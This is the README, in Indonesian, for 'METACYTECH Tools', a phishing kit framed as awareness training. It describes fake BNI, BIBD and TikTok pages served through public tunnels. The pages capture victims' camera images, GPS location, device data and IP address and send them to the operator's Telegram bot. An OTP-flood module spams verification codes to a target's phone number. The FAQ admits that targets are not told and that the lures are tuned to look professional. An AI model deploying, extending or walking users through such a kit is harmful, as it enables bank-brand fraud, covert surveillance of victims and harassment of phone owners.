```
  ███╗   ███╗ ███████╗ ████████╗ █████╗  ██████╗ ██╗   ██╗ ████████╗ ███████╗ ██████╗  ██╗  ██╗
  ████╗ ████║ ██╔════╝ ╚══██╔══╝ ██╔══██╗ ██╔════╝ ╚██╗ ██╔╝ ╚══██╔══╝ ██╔════╝ ██╔════╝  ██║  ██║
  ██╔████╔██║ █████╗      ██║    ███████║ ██║       ╚████╔╝     ██║    █████╗   ██║      ███████║
  ██║╚██╔╝██║ ██╔══╝      ██║    ██╔══██║ ██║        ╚██╔╝      ██║    ██╔══╝   ██║      ██╔══██║
  ██║ ╚═╝ ██║ ███████╗    ██║    ██║  ██║ ╚██████╗    ██║       ██║    ███████╗ ╚██████╗ ██║  ██║
  ╚═╝     ╚═╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝  ╚═════╝    ╚═╝       ╚═╝    ╚══════╝  ╚═════╝ ╚═╝  ╚═╝
```
# METACYTECH Tools

Platform simulasi phishing dan social engineering awareness multi-template.

**Multi Template:** BNI / TikTok / BIBD / OTP Flood  
**Fitur Baru:** TikTok Custom Title — ganti title URL sesuai keinginan
**Teknologi:** Cloudflare Tunnel / Telegram / Next.js

> [!WARNING]
> **DISCLAIMER PENTING**
>
> Tool ini dibuat untuk tujuan **edukasi, security awareness training, dan authorized penetration testing**.
> Penggunaan tool ini tanpa izin tertulis dari target adalah **ILEGAL** dan dapat dikenai sanksi hukum
> (UU ITE Pasal 30-35, Computer Fraud and Abuse Act, GDPR, dan hukum lainnya).
>
> **Anda bertanggung jawab penuh atas segala penggunaan tool ini.**

## Fitur

- **Multi-template system** — BNI, TikTok, BIBD, OTP Flood
- **TikTok Custom Title** — ganti title URL bebas (ditanya tiap pilih template TikTok)
- **One-click deploy** — Build Next.js + Cloudflare Tunnel / ngrok
- **Auto URL update** — metadataBase otomatis mengikuti tunnel URL
- **Camera & Location capture** — pengumpulan data berbasis permission
- **Telegram integration** — pengiriman data real-time
- **OTP Flood mode** — spam OTP multi-brand
- **Cross-platform** — Windows & Termux support
- **Auto fallback** — ngrok jika Cloudflare Tunnel gagal
- **Premium terminal UI** — animasi bersih, tanpa emoji di output terminal

## Persyaratan

| Komponen | Minimum |
|----------|---------|
| Python | 3.13+ |
| Node.js | 20.x+ |
| NPM | 10.x+ |
| Cloudflared | 2026+ (opsional, auto fallback ke ngrok) |
| OS | Windows 10+ / Termux (Android) |

### Install Cloudflared

**Windows:** Download dari [developers.cloudflare.com](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/) dan install ke `C:\Program Files (x86)\cloudflared\`

**Termux:**
```bash
pkg install cloudflared -y
```

### Setup Telegram Bot

1. Chat [@BotFather](https://t.me/BotFather) di Telegram
2. Kirim `/newbot` dan ikuti instruksi
3. Dapatkan **Bot Token** (format: `123456:ABC-DEF...`)
4. Buat grup, tambahkan bot sebagai admin
5. Kirim pesan ke grup, lalu kunjungi `https://api.telegram.org/bot<TOKEN>/getUpdates`
6. Dapatkan **Chat ID** dari response JSON

Buat file `.env.local` di root project:
```env
TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
TELEGRAM_CHAT_ID=-100123456789
```

## Cara Penggunaan

### Jalankan Launcher

**Windows:**
```bash
python launcher.py
```
Atau double-click `run.bat`

**Termux:**
```bash
cd ~/metacytech-tools
python launcher.py
```

### Alur Kerja

Saat pertama kali run, pilih template:

```
  Pilih template:
  [1] BNI  Transfer Bank
  [2] TikTok  Video Share Link
  [3] BIBD  Bank Brunei Darussalam
  [4] OTP Flood  Multi-Brand Spam

  Pilih template (1-4):
```

**Jika pilih TikTok**, akan muncul prompt title URL:

```
  Template TikTok - Masukkan Title URL kamu
  Contoh: TikTok - ChatGpt Pro Free
  atau biarkan kosong untuk default: TikTok - ChatGpt Pro Free

  Title URL:
```

Title ini akan otomatis dipakai di **Page Title, OpenGraph, Twitter Card,** dan semua metadata halaman. Biarkan kosong untuk pakai default.

Sistem akan otomatis:

1. Apply template files
2. Build Next.js app (Turbopack)
3. Start server (port 3000)
4. Start Cloudflare Tunnel (fallback ke ngrok jika perlu)
5. Update metadataBase dengan tunnel URL
6. Rebuild & restart server
7. Tampilkan **PUBLIC URL** untuk dibagikan

**Output terminal:**
```
  ok  Template: TikTok - Video Share Link

  ▓▓▓░░░░░░░░░░░░░  applying template
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  applying template

  ▓▓▓░░░░░░░░░░░░░  building
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  building

  ▓▓▓░░░░░░░░░░░░░  starting server
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  starting server

  ▓▓▓░░░░░░░░░░░░░  starting tunnel
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  starting tunnel

  url  https://xxxx-xxxx-xxxx-xxxx.trycloudflare.com
  local  http://localhost:3000
```

### Menu Utama

```
  [1]  Mulai Semua
       Build + Server + Cloudflare Tunnel
  [2]  Hentikan Semua
  [3]  Status
  [4]  Salin URL
  [5]  Ganti Template
  [6]  Keluar

  Pilih menu (1-6):
```

Menu **[5] Ganti Template** juga akan meminta custom title jika switch ke TikTok.

### Mendapatkan Data Target

1. Bagikan **PUBLIC URL** ke target
2. Monitor Telegram — data terkirim real-time saat target:
   - Mengizinkan akses kamera
   - Mengizinkan akses lokasi
3. **Data yang diterima:**
   - Foto dari kamera depan & Video
   - Lokasi GPS (dengan link Google Maps)
   - Info device (OS, browser, RAM, CPU, baterai)
   - IP address & ISP
   - Screen resolution & orientation

## Template Tersedia

| # | Template | Deskripsi | Mode |
|---|----------|-----------|------|
| 1 | BNI | Transfer Bank Verification | Web |
| 2 | TikTok | Video Share Link (kamera + lokasi) **+ Custom Title** | Web |
| 3 | BIBD | Bank Islam Brunei Darussalam | Web |
| 4 | OTP Flood | Spam OTP multi-brand (Paypal, Tinder, Telegram, Flip, Lazada, Netflix, dll) | CLI |

## Troubleshooting

### Cloudflared SSL Certificate Error (Termux)
```
failed to request quick Tunnel: tls: failed to verify certificate
```

**Solusi:**
```bash
pkg install ca-certificates openssl-tool -y
pkg upgrade -y
```

Jika masih gagal, sistem **auto-fallback ke ngrok**. Install ngrok:
```bash
cd ~
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip
unzip ngrok-v3-stable-linux-arm64.zip
chmod +x ngrok
mv ngrok $PREFIX/bin/
```

### "Could not get tunnel URL"

Cek apakah cloudflared/ngrok running:
```bash
ps aux | grep cloudflared
ps aux | grep ngrok
```

Cek tunnel.log:
```bash
cat tunnel.log
```

Test manual cloudflared:
```bash
cloudflared tunnel --url http://localhost:3000
```

### Telegram Bot Tidak Mengirim Data

Cek token & chat ID:
```bash
cat .env.local
```

Test manual dengan curl:
```bash
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>&text=Test"
```

### Next.js Build Error

Clear cache dan rebuild:
```bash
rm -rf .next node_modules
npm install
npm run build
```

### Port 3000 Already in Use

**Windows:**
```bash
netstat -ano | findstr :3000
taskkill /PID <PID> /F
```

**Termux:**
```bash
lsof -i :3000
kill -9 <PID>
```

## FAQ

**Q: Apakah tool ini legal?**
A: Ya, untuk security testing dengan **izin tertulis** dan awareness training. Penggunaan tanpa izin adalah **ILEGAL**.

**Q: Apakah target tahu sedang di-test?**
A: Tidak, kecuali Anda memberitahu setelahnya (disarankan untuk ethical testing).

**Q: Data disimpan dimana?**
A: Data dikirim langsung ke bot Telegram Anda. **TIDAK** disimpan di server kami.

**Q: Bisa running 24/7?**
A: Cloudflare Tunnel gratis tidak menjamin uptime 100%. Untuk production, gunakan VPS + domain sendiri.

**Q: Bisa custom title TikTok?**
A: Ya! Setiap pilih template TikTok (di awal atau via menu [5]), kamu akan diminta input title URL. Title ini otomatis mengganti metadata page title, OpenGraph, dan Twitter Card.

**Q: Bisa custom template?**
A: Ya! Buat folder baru di `templates/<nama>` dengan `page.tsx`, `layout.tsx`, dan assets di `public/`.

**Q: Kenapa build lambat di Termux?**
A: Next.js 16 Turbopack tidak support ARM. Sistem auto-downgrade ke Next.js 15 dengan Webpack (lebih lambat tapi stabil).

**Q: Kenapa tidak ada CAPTCHA?**
A: CAPTCHA dihapus karena tidak efektif. Sistem sekarang menggunakan camera & location permission yang terlihat lebih profesional.

**Q: Cara pakai OTP Flood?**
A: Pilih template [4] OTP Flood, lalu ikuti menu interaktif untuk mengirim OTP ke nomor target.

## Struktur Project

```
metacytech-tools/
├── src/
│   └── app/
│       ├── page.tsx              # Main page (diganti oleh template)
│       ├── layout.tsx            # Root layout
│       └── api/
│           ├── telegram/route.ts # Telegram API endpoint
│           └── capture/route.ts  # Data capture endpoint
├── templates/
│   ├── bni/
│   │   ├── page.tsx
│   │   ├── layout.tsx
│   │   └── public/
│   ├── tiktok/
│   │   ├── page.tsx
│   │   ├── layout.tsx
│   │   └── public/
│   └── bibd/
│       ├── page.tsx
│       ├── layout.tsx
│       └── public/
├── modules/
│   ├── otp_flood/
│   │   ├── finder.py             # Target number parser
│   │   └── trigger.py            # OTP trigger engine
│   └── reports/                  # Laporan OTP flood
├── public/                       # Static assets
├── launcher.py                   # Main launcher script
├── run.bat                       # Windows launcher
├── .env.local                    # Environment variables (TIDAK di-commit)
├── package.json                  # Node.js dependencies
└── requirements.txt              # Python dependencies
```

## Contributing

Kontribusi dipersilakan! Pastikan:
1. Follow ethical guidelines
2. Test thoroughly di Windows & Termux
3. Document semua perubahan
4. Create pull request dengan deskripsi jelas

## License

MIT License — Lihat [LICENSE](LICENSE) untuk detail

## Author

**Iqbal**
- GitHub: [@iqbalgsr46](https://github.com/iqbalgsr46)
- Project: [METACYTECH Tools](https://github.com/iqbalgsr46/metacytech-tools)

## Acknowledgments

- Next.js Team untuk amazing framework
- Cloudflare untuk free tunnel service
- Telegram untuk bot API
- Community untuk feedback & contributions

---

> [!CAUTION]
> **Gunakan dengan bijak dan bertanggung jawab.**
>
> Tool ini untuk Security Research & Awareness. Segala penyalahgunaan di luar tujuan edukasi dan authorized testing adalah tanggung jawab pengguna sepenuhnya.
